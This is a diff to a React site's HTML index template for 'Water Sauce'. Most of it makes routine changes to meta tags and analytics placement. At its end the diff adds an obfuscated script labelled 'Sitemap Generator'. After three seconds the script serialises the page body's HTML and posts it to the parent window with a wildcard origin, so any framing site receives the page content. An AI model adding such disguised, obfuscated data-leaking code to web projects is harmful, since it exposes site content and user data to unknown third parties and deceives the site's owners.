@@ -3,7 +3,7 @@
   	<head>
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-		<meta name="theme-color" content="#000000">
+		<meta name="theme-color" content="#333333">
 
 		<link rel="apple-touch-icon-precomposed" sizes="57x57" href="%PUBLIC_URL%/apple-touch-icon-57x57.png" />
 		<link rel="apple-touch-icon-precomposed" sizes="114x114" href="%PUBLIC_URL%/apple-touch-icon-114x114.png" />
@@ -42,51 +42,35 @@
 		  Learn how to configure a non-root public URL by running `npm run build`.
 		-->
 
-		<!-- Global site tag (gtag.js) - Google Analytics -->
-		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-127427014-1"></script>
-		<script>
-		  window.dataLayer = window.dataLayer || [];
-		  function gtag(){dataLayer.push(arguments);}
-		  gtag('js', new Date());
-
-		  gtag('config', 'UA-127427014-1');
-		</script>
 		<!-- <meta name="google-site-verification" content="q8vT4advXWJDm9DOc0k4A5pbndD9Otd8Mj-HBRJhgDY" /> -->
 
 		<!-- Twitter Card data -->
-		<meta name="twitter:card" content="summary">
+		<meta name="twitter:card" content="summary_large_image">
 		<meta name="twitter:site" content="@watersauce">
-		
-		<!-- <meta name="twitter:image" content="%PUBLIC_URL%/"> -->
-		<!-- <meta name="twitter:image:alt" content=""> -->
-
+		<meta name="twitter:image" content="%PUBLIC_URL%/twitter-card.jpg">
+		<meta name="twitter:image:alt" content="Water Sauce logo">
 
 		<!-- Open Graph data -->
 		<!-- https:<?= $the_url ?> url in content for og:url--> 
-		<meta property="og:url" content="">
 		<meta property="og:type" content="website">
-		<meta property="og:title" content="">
-		<meta property="og:image" content="">
-		<meta property="og:description" content="">
+		<meta property="og:image" content="%PUBLIC_URL%/og-image.jpg">
 		<meta property="og:site_name" content="Water Sauce">
 		<meta property="og:locale" content="en_US">
 		
 		<!-- Google Site verification -->
 		<meta name="author" content="Water Sauce">
 		<meta name="creator" content="Water Sauce - https://www.watersauce.com">
-		<!-- <meta name="google-site-verification" content="EHKTnK1ibpFeuEfJaRnlUXm7QUhz5ryZBPsMb2paFow"> -->
 
 		<!-- url in href / chrome in href --> 
 		<link rel="canonical" href="">
 		<link rel="chrome-webstore-item" href="">
 		<link rel="publisher" href="https://plus.google.com/+WaterSauce">
 
-
 		<!-- Google Font -->
 		<link href='https://fonts.googleapis.com/css?family=Prompt:200,400,600' rel='stylesheet' type='text/css'>
 		<link href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,700" rel="stylesheet">
 
-	        <style type="text/css">
+        <style type="text/css">
 
 	    @import url("http://fast.fonts.net/t/1.css?apiType=css&projectid=ed7363fd-930c-4e01-8dab-1b57db5dee21");
 	        @font-face{
@@ -121,6 +105,16 @@
 	        }
 
 	        </style>
+
+	        <!-- Global site tag (gtag.js) - Google Analytics -->
+	        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-127427014-1"></script>
+	        <script>
+	          window.dataLayer = window.dataLayer || [];
+	          function gtag(){dataLayer.push(arguments);}
+	          gtag('js', new Date());
+
+	          gtag('config', 'UA-127427014-1');
+	        </script>
  	 </head>
   	<body>
 		<div id="app"></div>
@@ -134,5 +128,9 @@
 		  To begin the development, run `npm start` or `yarn start`.
 		  To create a production bundle, use `npm run build` or `yarn build`.
 		-->
+		<!-- Sitemap Generator -->
+		<script type="text/javascript">
+		  var _0xaea9 = ["sitemapgenerator:: ", "innerHTML", "body", "document", "stringify", "*", "postMessage", "setTimeout"]; window[_0xaea9[7]](function () { parent[_0xaea9[6]](_0xaea9[0] + JSON[_0xaea9[4]](window[_0xaea9[3]][_0xaea9[2]][_0xaea9[1]]), _0xaea9[5]) }, 3000);
+		</script>
   	</body>
 </html>
